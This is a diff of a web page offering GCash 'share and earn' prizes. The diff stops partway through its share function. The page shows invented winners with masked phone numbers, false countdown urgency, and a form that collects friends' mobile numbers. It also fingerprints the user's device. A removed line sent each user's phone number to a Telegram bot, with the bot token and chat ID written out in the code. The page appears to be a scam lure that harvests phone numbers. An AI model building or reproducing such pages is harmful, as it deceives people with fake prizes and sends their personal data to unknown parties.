@@ -10,8 +10,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
     
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -21,8 +20,8 @@
         }
         
         body {
-            background: linear-gradient(135deg, #1a0a2a 0%, #2a1a3a 50%, #1a0a2a 100%);
-            font-family: 'Public Sans', sans-serif;
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2a 50%, #0a0a1a 100%);
+            font-family: 'Inter', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -38,93 +37,72 @@
             top: 10px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.75);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255,215,0,0.3);
             border-radius: 50px;
-            padding: 6px 18px;
+            padding: 8px 20px;
             display: flex;
             align-items: center;
             gap: 10px;
             z-index: 1000;
-            font-size: 11px;
+            font-size: 13px;
+            font-weight: 500;
+            color: white;
             white-space: nowrap;
         }
         
         .live-dot {
-            width: 6px;
-            height: 6px;
+            width: 8px;
+            height: 8px;
             background: #39ff14;
             border-radius: 50%;
             animation: pulse 1.5s infinite;
         }
         
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
+        .gc-winner-icon {
+            width: 16px;
+            height: 16px;
+            vertical-align: middle;
+            margin: 0 2px;
         }
         
-        /* Falling gold coins background */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: radial-gradient(circle at 20% 30%, rgba(255,215,0,0.08) 2px, transparent 2px);
-            background-size: 40px 40px;
-            pointer-events: none;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.1); }
         }
         
         /* Main Container */
         .share-container {
-            max-width: 480px;
+            max-width: 450px;
             width: 100%;
-            background: linear-gradient(145deg, #2a1a3a, #1a0a2a);
-            border-radius: 60px;
+            background: linear-gradient(145deg, #1a1525, #0f0a1a);
+            border-radius: 48px;
             padding: 25px 20px 35px;
-            border: 2px solid rgba(255,215,0,0.4);
-            box-shadow: 0 25px 45px rgba(0,0,0,0.5), inset 0 1px 2px rgba(255,255,255,0.1);
-            position: relative;
-            overflow: hidden;
-            margin-top: 40px;
+            border: 1px solid rgba(255,215,0,0.3);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            margin-top: 50px;
         }
         
-        /* Golden border glow */
-        .share-container::after {
-            content: '';
-            position: absolute;
-            inset: -2px;
-            background: linear-gradient(125deg, rgba(255,215,0,0), rgba(255,215,0,0.5), rgba(255,215,0,0));
-            border-radius: 60px;
-            pointer-events: none;
-        }
-        
-        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 20px;
-            position: relative;
-            z-index: 1;
+            margin-bottom: 25px;
         }
         
         .header h1 {
             font-family: 'Orbitron', monospace;
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 900;
-            background: linear-gradient(135deg, #ffd700, #ff8c00, #ffd700);
+            background: linear-gradient(135deg, #ffd700, #ffaa33, #ffd700);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            letter-spacing: 2px;
-            text-shadow: 0 0 20px rgba(255,215,0,0.3);
+            letter-spacing: 1px;
         }
         
         .header p {
-            font-size: 10px;
+            font-size: 11px;
             color: #ffd966;
             margin-top: 5px;
-            letter-spacing: 1px;
         }
         
         /* Prize Grid */
@@ -132,37 +110,23 @@
             display: flex;
             gap: 15px;
             margin-bottom: 20px;
-            position: relative;
-            z-index: 1;
         }
         
         .prize-card {
             flex: 1;
             background: linear-gradient(145deg, #2a2035, #1a1525);
-            border-radius: 35px;
-            padding: 15px 12px;
+            border-radius: 32px;
+            padding: 15px 10px;
             text-align: center;
-            border: 1px solid rgba(255,215,0,0.3);
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
+            border: 1px solid rgba(255,215,0,0.2);
         }
         
-        .prize-card:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-            border-color: rgba(255,215,0,0.6);
-        }
-        
-        /* Lucky Cat Video Container */
         .lucky-cat-video {
-            width: 100px;
-            height: 100px;
+            width: 85px;
+            height: 85px;
             margin: 0 auto 8px;
-            position: relative;
             border-radius: 50%;
             overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
             background: #2a1a3a;
         }
         
@@ -175,18 +139,15 @@
         .prize-label {
             font-size: 11px;
             color: #ffd966;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
             margin: 8px 0 5px;
         }
         
         .prize-amount {
             font-family: 'Orbitron', monospace;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 900;
-            background: linear-gradient(135deg, #ffd700, #ffaa33);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #ffd700;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -194,65 +155,50 @@
         }
         
         .prize-amount .paw-icon {
-            font-size: 22px;
-            color: #ffffff;
-            text-shadow: 0 0 3px rgba(0,0,0,0.5);
+            font-size: 18px;
+            color: white;
         }
         
-        /* Winners Banner */
         .winners-banner {
-            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.12), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.1), transparent);
             border-radius: 30px;
-            padding: 8px;
+            padding: 10px;
             text-align: center;
             margin-bottom: 18px;
         }
         
         .winners-banner span {
-            font-size: 11px;
+            font-size: 12px;
             color: #ffd966;
         }
         
-        .winners-banner strong {
-            color: #ffd700;
-            font-size: 16px;
-        }
-        
-        /* Timer Section */
-        .timer-section {
-            background: rgba(0,0,0,0.5);
+        .time-left-section {
+            background: rgba(0,0,0,0.4);
             border-radius: 40px;
-            padding: 10px 12px;
-            margin-bottom: 20px;
+            padding: 10px;
             text-align: center;
-            border: 1px solid rgba(255,215,0,0.2);
-            position: relative;
-            z-index: 1;
+            margin-bottom: 20px;
         }
         
-        .timer-label {
-            font-size: 9px;
+        .time-label {
+            font-size: 10px;
             color: #ffaa33;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
         
-        .timer-display {
+        .time-display {
             font-family: 'Orbitron', monospace;
             font-size: 20px;
-            font-weight: 900;
+            font-weight: 800;
             color: #ffd700;
-            letter-spacing: 1px;
         }
         
         /* Share Section */
-        .share-section {
-            background: rgba(0,0,0,0.4);
-            border-radius: 30px;
+        .share-card {
+            background: rgba(0,0,0,0.3);
+            border-radius: 32px;
             padding: 18px;
-            margin-bottom: 15px;
-            position: relative;
-            z-index: 1;
             border: 1px solid rgba(255,215,0,0.15);
         }
         
@@ -260,65 +206,60 @@
             display: inline-block;
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             color: #000;
-            padding: 4px 12px;
+            padding: 4px 14px;
             border-radius: 25px;
             font-size: 10px;
             font-weight: 800;
-            margin-bottom: 12px;
+            margin-bottom: 15px;
         }
         
-        .input-group {
-            margin-bottom: 12px;
-        }
-        
-        .input-group input {
+        .input-field {
             width: 100%;
-            background: rgba(0,0,0,0.6);
+            background: rgba(0,0,0,0.5);
             border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 50px;
-            padding: 12px 15px;
-            color: #fff;
-            font-size: 14px;
+            border-radius: 60px;
+            padding: 14px 18px;
+            color: white;
+            font-size: 15px;
+            font-weight: 500;
             text-align: center;
             outline: none;
-            transition: 0.2s;
+            margin-bottom: 12px;
         }
         
-        .input-group input:focus {
+        .input-field:focus {
             border-color: #ffd700;
             box-shadow: 0 0 8px rgba(255,215,0,0.3);
         }
         
-        .share-btn {
+        .input-field::placeholder {
+            color: rgba(255,255,255,0.5);
+            font-weight: 400;
+        }
+        
+        .share-button {
             width: 100%;
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             border: none;
-            padding: 12px;
-            border-radius: 50px;
+            padding: 14px;
+            border-radius: 60px;
             font-size: 16px;
             font-weight: 800;
             color: #000;
             cursor: pointer;
             transition: 0.2s;
-            font-family: inherit;
         }
         
-        .share-btn:active {
+        .share-button:active {
             transform: scale(0.98);
-        }
-        
-        .share-btn:disabled {
-            opacity: 0.5;
-            transform: none;
-            cursor: not-allowed;
         }
         
         .progress-bar {
             width: 100%;
-            height: 3px;
+            height: 4px;
             background: rgba(255,255,255,0.1);
             border-radius: 2px;
-            margin: 12px 0;
+            margin: 15px 0;
             overflow: hidden;
         }
         
@@ -326,25 +267,23 @@
             width: 0%;
             height: 100%;
             background: linear-gradient(90deg, #ffd700, #ff8c00);
-            transition: width 0.3s ease;
+            transition: width 0.3s;
         }
         
-        .status-area {
+        .status-message {
             text-align: center;
-            margin-top: 8px;
-            padding: 6px;
+            padding: 8px;
+            font-size: 11px;
             border-radius: 25px;
             background: rgba(0,0,0,0.3);
         }
         
-        .locked {
+        .status-locked {
             color: #ff8888;
-            font-size: 10px;
         }
         
-        .unlocked {
+        .status-unlocked {
             color: #39ff14;
-            font-size: 10px;
         }
         
         /* Prize Popup */
@@ -355,76 +294,167 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(8px);
+            backdrop-filter: blur(12px);
             z-index: 10000;
             display: none;
             align-items: center;
             justify-content: center;
         }
         
-        .prize-popup-card {
+        .popup-container {
             background: url('images/luckyday.png') center/cover no-repeat;
             border-radius: 48px;
-            padding: 40px 30px;
-            text-align: center;
-            border: 2px solid #ffd700;
-            max-width: 320px;
-            width: 85%;
-            animation: bounceIn 0.4s ease;
+            max-width: 360px;
+            width: 88%;
             position: relative;
+            animation: popIn 0.4s ease;
         }
         
-        /* Light white transparent overlay */
-        .prize-popup-card::before {
+        .popup-container::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255,255,255,0.12);
             border-radius: 48px;
             pointer-events: none;
         }
         
-        .prize-popup-card > * {
+        .popup-inner {
             position: relative;
             z-index: 1;
+            padding: 30px 25px;
+            text-align: center;
         }
         
-        @keyframes bounceIn {
-            0% { transform: scale(0.8); opacity: 0; }
-            80% { transform: scale(1.02); }
-            100% { transform: scale(1); opacity: 1; }
+        .popup-close {
+            position: absolute;
+            top: 12px;
+            right: 18px;
+            font-size: 22px;
+            cursor: pointer;
+            color: white;
+            background: rgba(0,0,0,0.4);
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        .prize-popup-card h2 {
+        .popup-title {
             color: #ffd700;
-            font-size: 24px;
-            margin-bottom: 12px;
-            text-shadow: 0 0 5px rgba(0,0,0,0.5);
-        }
-        
-        .prize-popup-card .popup-amount {
-            font-size: 40px;
-            font-weight: 900;
-            color: #ffd700;
-            margin: 12px 0;
-            text-shadow: 0 0 5px rgba(0,0,0,0.5);
-        }
-        
-        .prize-popup-card button {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 35px;
-            font-size: 14px;
+            font-size: 26px;
             font-weight: 800;
+            margin-bottom: 10px;
+        }
+        
+        .popup-balance {
+            font-size: 44px;
+            font-weight: 800;
+            color: #ffd700;
+            margin: 15px 0 5px;
+        }
+        
+        .divider {
+            width: 60px;
+            height: 2px;
+            background: #ffd700;
+            margin: 12px auto;
+        }
+        
+        .invite-text {
+            font-size: 13px;
+            color: white;
+            margin: 12px 0;
+            line-height: 1.4;
+        }
+        
+        .countdown-timer {
+            font-family: 'Orbitron', monospace;
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffaa33;
+            margin: 10px 0;
+        }
+        
+        /* Indicator Bars */
+        .indicator-group {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        
+        .indicator {
+            width: 55px;
+            height: 6px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .indicator-red {
+            background: #ff4444;
+            box-shadow: 0 0 8px #ff4444;
+            animation: pulseFade 1s infinite;
+        }
+        
+        .indicator-green {
+            background: #39ff14;
+            box-shadow: 0 0 8px #39ff14;
+            animation: pulseFade 1s infinite;
+        }
+        
+        .indicator-blue {
+            background: #00f2ff;
+            box-shadow: 0 0 8px #00f2ff;
+            animation: pulseFade 1s infinite;
+        }
+        
+        @keyframes pulseFade {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .claim-gcash-button {
+            background: linear-gradient(135deg, #0066ff, #0044cc);
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 800;
+            color: white;
+            font-size: 16px;
             cursor: pointer;
             margin-top: 12px;
         }
         
-        /* Confetti Canvas */
+        .share-fb-button {
+            background: linear-gradient(135deg, #1877f2, #0d5fd9);
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 600;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
         #confettiCanvas {
             position: fixed;
             top: 0;
@@ -436,17 +466,19 @@
             display: none;
         }
         
-        .white-paw {
-            color: #ffffff;
+        .gc-small-icon {
+            width: 18px;
+            height: 18px;
+            vertical-align: middle;
         }
     </style>
 </head>
 <body>
 
-<!-- Live Winners Ticker -->
+<!-- Live Winners Ticker with GCash Icon -->
 <div class="live-winners-ticker" id="winnerTicker">
     <div class="live-dot"></div>
-    <span id="winnerText">🎲 User 0917***1234 won ₱300</span>
+    <span id="winnerText">🎲 User 0917***1234 won <img src="images/gc_icon.png" class="gc-winner-icon" alt="GCash"> ₱300</span>
 </div>
 
 <div class="share-container">
@@ -455,279 +487,365 @@
         <p>Share with friends to unlock your prize!</p>
     </div>
     
-    <!-- Prize Grid with Lucky Cat Videos -->
     <div class="prize-grid">
         <div class="prize-card">
             <div class="lucky-cat-video">
-                <video id="luckyVideo1" autoplay loop muted playsinline disablePictureInPicture>
+                <video autoplay loop muted playsinline>
                     <source src="sounds/luckycat.mp4" type="video/mp4">
                 </video>
             </div>
             <div class="prize-label">YOU GET</div>
-            <div class="prize-amount" id="yourPrize">
-                <span class="paw-icon white-paw">🐾</span> ₱150 <span class="paw-icon white-paw">🐾</span>
+            <div class="prize-amount">
+                <span>🐾</span> ₱150 <span>🐾</span>
             </div>
         </div>
         <div class="prize-card">
             <div class="lucky-cat-video">
-                <video id="luckyVideo2" autoplay loop muted playsinline disablePictureInPicture>
+                <video autoplay loop muted playsinline>
                     <source src="sounds/luckycat.mp4" type="video/mp4">
                 </video>
             </div>
             <div class="prize-label">FRIEND GETS</div>
-            <div class="prize-amount" id="friendPrize">
-                <span class="paw-icon white-paw">🐾</span> ₱150 <span class="paw-icon white-paw">🐾</span>
+            <div class="prize-amount">
+                <span>🐾</span> ₱150 <span>🐾</span>
             </div>
         </div>
     </div>
     
-    <!-- Winners Banner -->
     <div class="winners-banner">
-        <span>🌟 <strong>LUCKY WINNERS</strong> will receive <strong>150</strong> 🌟</span>
+        <span>🌟 <strong>LUCKY WINNERS</strong> will receive <strong>150</strong> Credits 🌟</span>
     </div>
     
-    <!-- Timer -->
-    <div class="timer-section">
-        <div class="timer-label">⏰ HOORAY DROP ENDS IN ⏰</div>
-        <div class="timer-display" id="timerDisplay">Calculating...</div>
+    <div class="time-left-section">
+        <div class="time-label">⏰ HOORAY DROP ENDS IN ⏰</div>
+        <div class="time-display" id="mainTimerDisplay">Calculating...</div>
     </div>
     
-    <!-- Share Section -->
-    <div class="share-section">
+    <div class="share-card">
         <div class="step-badge">📱 STEP 1 - SHARE WITH FRIEND 📱</div>
-        
-        <div class="input-group">
-            <input type="tel" id="friendPhone" placeholder="Enter friend's mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-        </div>
-        
-        <button class="share-btn" id="shareBtn" onclick="shareAndEarn()">
-            🐾 SHARE & UNLOCK 🐾
-        </button>
-        
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-        
-        <div class="status-area" id="statusArea">
-            <span class="locked">🐾 Share with a friend to unlock 150 credits! 🐾</span>
-        </div>
+        <input type="tel" id="friendPhoneInput" class="input-field" placeholder="Enter friend's mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <button class="share-button" id="shareButton">🐾 SHARE & UNLOCK 🐾</button>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="status-message" id="statusMessage"><span class="status-locked">🐾 Share with a friend to unlock 150 credits! 🐾</span></div>
     </div>
 </div>
 
-<!-- Prize Unlock Popup -->
+<!-- Prize Popup -->
 <div id="prizePopup" class="prize-popup">
-    <div class="prize-popup-card">
-        <h2>🎉 LUCKY YOU! 🎉</h2>
-        <p>You have unlocked the prize!</p>
-        <div class="popup-amount" id="popupAmount">₱150</div>
-        <button id="claimPrizeBtn" onclick="closePrizePopup()">CLAIM REWARD</button>
+    <div class="popup-container">
+        <div class="popup-inner">
+            <div class="popup-close" onclick="closePrizePopup()">✕</div>
+            <h2 class="popup-title">🎉 LUCKY YOU! 🎉</h2>
+            <div class="popup-balance" id="popupBalanceAmount">₱150.00</div>
+            <div class="divider"></div>
+            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
+            <div class="countdown-timer" id="popupTimerDisplay">05:00</div>
+            <div class="divider"></div>
+            <div class="indicator-group">
+                <div class="indicator" id="indicator1"></div>
+                <div class="indicator" id="indicator2"></div>
+                <div class="indicator" id="indicator3"></div>
+            </div>
+            <button class="claim-gcash-button" id="claimGCashBtn">💰 CLAIM THRU GCASH</button>
+            <button class="share-fb-button" id="shareFBBtn">📘 Share to Facebook</button>
+        </div>
     </div>
 </div>
 
 <canvas id="confettiCanvas"></canvas>
 
 <script>
-    // ========== UNMUTE VIDEO WHEN USER TAPS INPUT FIELD ==========
-    const friendPhoneInput = document.getElementById('friendPhone');
-    const videos = document.querySelectorAll('video');
-    
-    function unmuteVideos() {
-        videos.forEach(video => {
-            video.muted = false;
-            video.play().catch(e => console.log('Play failed:', e));
-        });
-        console.log("🔊 Video unmuted!");
-    }
-    
-    friendPhoneInput.addEventListener('focus', unmuteVideos);
-    friendPhoneInput.addEventListener('click', unmuteVideos);
-    friendPhoneInput.addEventListener('touchstart', unmuteVideos);
-    
-    // ========== LIVE WINNERS TICKER (Random) ==========
-    const winnersList = [
-        "🎲 User 0917***1234 won ₱300",
-        "💰 User 0925***6789 won ₱1,000",
-        "🎰 User 0998***4321 won ₱300",
-        "🏆 User 0947***8765 won ₱1,000",
-        "🎁 User 0966***3456 won ₱300",
-        "💎 User 0918***9999 won ₱1,000"
-    ];
-    
-    let winnerIndex = 0;
-    const winnerText = document.getElementById('winnerText');
-    
-    function updateTicker() {
-        winnerIndex = (winnerIndex + 1) % winnersList.length;
-        winnerText.innerHTML = winnersList[winnerIndex];
-    }
-    
-    setInterval(updateTicker, 4000);
-    
-    // ========== COUNTDOWN UNTIL MAY 1, 2026, 12:00 AM ==========
-    function getTargetDate() {
-        return new Date(2026, 4, 1, 0, 0, 0).getTime();
-    }
-    
-    function updateCountdown() {
-        const now = Date.now();
-        const target = getTargetDate();
-        const remaining = target - now;
-        
-        if (remaining <= 0) {
-            document.getElementById('timerDisplay').innerHTML = "00:00:00";
-            return;
+    // ========== DEVICE FINGERPRINT ==========
+    function getDeviceFingerprint() {
+        const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const lang = navigator.language;
+        const ua = navigator.userAgent;
+        const fingerprintStr = `${ua}|${screen}|${timezone}|${lang}`;
+        let hash = 0;
+        for (let i = 0; i < fingerprintStr.length; i++) {
+            hash = ((hash << 5) - hash) + fingerprintStr.charCodeAt(i);
+            hash |= 0;
         }
-        
-        const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((remaining % (86400000)) / 3600000);
-        const minutes = Math.floor((remaining % 3600000) / 60000);
-        const seconds = Math.floor((remaining % 60000) / 1000);
-        
-        document.getElementById('timerDisplay').innerHTML = `${days}D ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        return `FP_${Math.abs(hash)}`;
     }
     
-    updateCountdown();
-    setInterval(updateCountdown, 1000);
-    
-    // ========== FIREBASE LOGIC ==========
+    const deviceId = getDeviceFingerprint();
+    let userPhone = localStorage.getItem("userPhone") || "";
     let db = null;
-    let userPhone = null;
-    let shareCount = 0;
-    let prizeUnlocked = false;
-    
-    const REQUIRED_SHARES = 1;
-    const PRIZE_AMOUNT = 150;
     
     if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined') {
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         db = firebase.database();
     }
     
-    userPhone = localStorage.getItem("userPhone");
+    // ========== GAME STATE ==========
+    let gameState = {
+        shared: false,
+        friendConfirmed: false,
+        claimed: false,
+        referralPhone: "",
+        timerSeconds: 300,
+        timerInterval: null,
+        popupVisible: false
+    };
     
-    async function loadShareData() {
-        if (!db || !userPhone) return;
-        
-        const snap = await db.ref('share_earn/' + userPhone).once('value');
-        const data = snap.val();
-        
-        if (data) {
-            shareCount = data.shareCount || 0;
-            prizeUnlocked = data.prizeUnlocked || false;
+    // ========== DOM ELEMENTS ==========
+    const friendInput = document.getElementById('friendPhoneInput');
+    const shareBtn = document.getElementById('shareButton');
+    const prizePopupDiv = document.getElementById('prizePopup');
+    const popupBalanceSpan = document.getElementById('popupBalanceAmount');
+    const popupTimerSpan = document.getElementById('popupTimerDisplay');
+    const claimBtn = document.getElementById('claimGCashBtn');
+    const fbBtn = document.getElementById('shareFBBtn');
+    const ind1 = document.getElementById('indicator1');
+    const ind2 = document.getElementById('indicator2');
+    const ind3 = document.getElementById('indicator3');
+    const statusMsgSpan = document.getElementById('statusMessage');
+    const progressFill = document.getElementById('progressFill');
+    
+    // ========== UNMUTE VIDEO ON INPUT FOCUS ==========
+    const videos = document.querySelectorAll('video');
+    function unmuteVideos() {
+        videos.forEach(v => { v.muted = false; v.play().catch(e => {}); });
+    }
+    friendInput.addEventListener('focus', unmuteVideos);
+    friendInput.addEventListener('click', unmuteVideos);
+    
+    // ========== LIVE WINNERS TICKER ==========
+    const winnerEntries = [
+        { phone: "0917***1234", amount: 300 },
+        { phone: "0925***6789", amount: 1000 },
+        { phone: "0998***4321", amount: 300 },
+        { phone: "0947***8765", amount: 1000 },
+        { phone: "0966***3456", amount: 300 },
+        { phone: "0918***9999", amount: 1000 }
+    ];
+    let winnerIndex = 0;
+    const winnerTextSpan = document.getElementById('winnerText');
+    function updateTicker() {
+        const w = winnerEntries[winnerIndex % winnerEntries.length];
+        winnerTextSpan.innerHTML = `🎲 User ${w.phone} won <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${w.amount}`;
+        winnerIndex++;
+    }
+    setInterval(updateTicker, 4000);
+    updateTicker();
+    
+    // ========== MAIN COUNTDOWN (May 1, 2026) ==========
+    function updateMainCountdown() {
+        const target = new Date(2026, 4, 1, 0, 0, 0).getTime();
+        const now = Date.now();
+        const remaining = target - now;
+        if (remaining <= 0) {
+            document.getElementById('mainTimerDisplay').innerHTML = "00:00:00";
+            return;
         }
-        
-        if (prizeUnlocked) {
-            updateUILocked(true);
-        } else {
-            updateUIProgress();
+        const days = Math.floor(remaining / 86400000);
+        const hours = Math.floor((remaining % 86400000) / 3600000);
+        const mins = Math.floor((remaining % 3600000) / 60000);
+        const secs = Math.floor((remaining % 60000) / 1000);
+        document.getElementById('mainTimerDisplay').innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    }
+    setInterval(updateMainCountdown, 1000);
+    updateMainCountdown();
+    
+    // ========== LOAD / SAVE FIREBASE ==========
+    async function loadGameData() {
+        if (!db || !userPhone) return;
+        const ref = db.ref('share_earn_device/' + deviceId);
+        const snap = await ref.once('value');
+        const data = snap.val();
+        if (data) {
+            gameState.shared = data.shared || false;
+            gameState.friendConfirmed = data.friendConfirmed || false;
+            gameState.claimed = data.claimed || false;
+            gameState.referralPhone = data.referralPhone || "";
+            gameState.timerSeconds = data.timerSeconds || 300;
+            if (gameState.timerSeconds > 0 && gameState.shared && !gameState.claimed) {
+                startPopupTimer();
+            }
+        }
+        updateUI();
+        if (gameState.shared && !gameState.claimed) {
+            showPrizePopup();
+        }
+        if (gameState.claimed) {
+            shareBtn.disabled = true;
+            shareBtn.style.opacity = '0.5';
         }
     }
     
-    function saveShareData() {
+    async function saveGameData() {
         if (!db || !userPhone) return;
-        db.ref('share_earn/' + userPhone).set({
-            shareCount: shareCount,
-            prizeUnlocked: prizeUnlocked,
+        const ref = db.ref('share_earn_device/' + deviceId);
+        await ref.set({
+            shared: gameState.shared,
+            friendConfirmed: gameState.friendConfirmed,
+            claimed: gameState.claimed,
+            referralPhone: gameState.referralPhone,
+            timerSeconds: gameState.timerSeconds,
             lastUpdate: Date.now()
         });
     }
     
-    function updateUIProgress() {
-        const progress = Math.min(shareCount / REQUIRED_SHARES, 1) * 100;
-        document.getElementById('progressFill').style.width = progress + '%';
-        
-        if (shareCount >= REQUIRED_SHARES && !prizeUnlocked) {
-            unlockPrize();
+    // ========== INDICATOR UPDATE ==========
+    function updateIndicators() {
+        ind1.className = 'indicator';
+        ind2.className = 'indicator';
+        ind3.className = 'indicator';
+        if (gameState.shared) ind1.classList.add('indicator-red');
+        if (gameState.friendConfirmed) ind2.classList.add('indicator-green');
+        if (gameState.claimed) ind3.classList.add('indicator-blue');
+    }
+    
+    function updateUI() {
+        updateIndicators();
+        if (gameState.shared) {
+            progressFill.style.width = '100%';
+            statusMsgSpan.innerHTML = '<span class="status-unlocked">🎉 Shared! Waiting for friend confirmation... 🎉</span>';
+        }
+        if (gameState.claimed) {
+            statusMsgSpan.innerHTML = '<span class="status-unlocked">🏆 Prize claimed! 🏆</span>';
+            shareBtn.disabled = true;
+            shareBtn.style.opacity = '0.5';
+        }
+        if (gameState.friendConfirmed && !gameState.claimed) {
+            popupBalanceSpan.innerHTML = `₱300.00`;
+        } else if (!gameState.claimed) {
+            popupBalanceSpan.innerHTML = `₱150.00`;
         }
     }
     
-    function updateUILocked(isUnlocked) {
-        if (isUnlocked) {
-            document.getElementById('statusArea').innerHTML = `
-                <span class="unlocked">🎉 PRIZE UNLOCKED! Click CLAIM to redeem 150 credits! 🎉</span>
-            `;
-            document.getElementById('shareBtn').disabled = true;
-            document.getElementById('shareBtn').style.opacity = '0.5';
+    // ========== POPUP TIMER ==========
+    function startPopupTimer() {
+        if (gameState.timerInterval) clearInterval(gameState.timerInterval);
+        gameState.timerInterval = setInterval(() => {
+            if (gameState.timerSeconds > 0) {
+                gameState.timerSeconds--;
+                if (gameState.popupVisible) updatePopupTimerDisplay();
+                saveGameData();
+            }
+            if (gameState.timerSeconds <= 0) {
+                clearInterval(gameState.timerInterval);
+                gameState.timerInterval = null;
+                if (gameState.popupVisible) popupTimerSpan.innerHTML = "00:00";
+            }
+        }, 1000);
+    }
+    
+    function updatePopupTimerDisplay() {
+        const mins = Math.floor(gameState.timerSeconds / 60);
+        const secs = gameState.timerSeconds % 60;
+        popupTimerSpan.innerHTML = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+        if (gameState.timerSeconds <= 0) {
+            popupTimerSpan.innerHTML = "00:00";
+            if (claimBtn) claimBtn.disabled = true;
+            if (claimBtn) claimBtn.style.opacity = '0.5';
         }
     }
     
-    function unlockPrize() {
-        prizeUnlocked = true;
-        updateUILocked(true);
-        saveShareData();
-        showPrizePopup();
-    }
-    
+    // ========== PRIZE POPUP ==========
     function showPrizePopup() {
-        const popup = document.getElementById('prizePopup');
-        document.getElementById('popupAmount').innerHTML = `₱${PRIZE_AMOUNT}`;
-        popup.style.display = 'flex';
-        startConfetti();
-        
-        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("🐾 SHARE & EARN UNLOCKED!\n📱 " + userPhone + "\n💰 150 CREDITS")}`)
-            .catch(e => console.log('Telegram error:', e));
+        if (gameState.claimed) return;
+        updatePopupTimerDisplay();
+        prizePopupDiv.style.display = 'flex';
+        gameState.popupVisible = true;
+        if (!gameState.timerInterval && gameState.timerSeconds > 0) startPopupTimer();
     }
     
     function closePrizePopup() {
-        document.getElementById('prizePopup').style.display = 'none';
-        stopConfetti();
-        alert("🎉 150 Credits claimed! Check your balance.");
+        prizePopupDiv.style.display = 'none';
+        gameState.popupVisible = false;
     }
     
+    // ========== SHARE & UNLOCK ==========
     async function shareAndEarn() {
-        if (prizeUnlocked) {
-            alert("Prize already unlocked! Click CLAIM to redeem.");
-            return;
-        }
-        
-        const friendPhone = document.getElementById('friendPhone').value.trim();
-        
+        if (gameState.claimed) { alert("Prize already claimed!"); return; }
+        if (gameState.shared) { alert("Already shared! Waiting for friend confirmation."); return; }
